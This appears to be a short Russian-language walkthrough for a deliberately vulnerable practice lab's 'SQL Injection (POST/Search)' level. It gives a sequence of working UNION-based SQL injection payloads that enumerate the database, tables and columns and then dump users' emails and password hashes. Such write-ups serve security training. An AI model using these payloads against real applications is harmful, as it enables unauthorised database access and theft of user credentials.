---
title: SQL_Injection_POSTSearch
sidebar_position: 1
---

# SQL Injection (POST/Search)

**(low)**


Используем строку

asd' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL-- -

чтобы вывести название базы

теперь используем строку

asd' UNION SELECT NULL,table\_name,NULL,NULL,NULL,NULL,NULL from information\_schema.tables where table\_schema=database()-- -

чтобы узнать, какие в базе есть таблицы

на интересует users, поэтому используем следующую строку

asd' UNION SELECT NULL,column\_name,NULL,NULL,NULL,NULL,NULL from information\_schema.columns where table\_name='users'-- -

чтобы получить список пользователей

сдампим пароли и почты этим payload

asd' UNION SELECT NULL,email,password,NULL,NULL,NULL,NULL from users-- -

![Dumping email and password hashes](images/SQL_Injection_POSTSearch_img_1.png)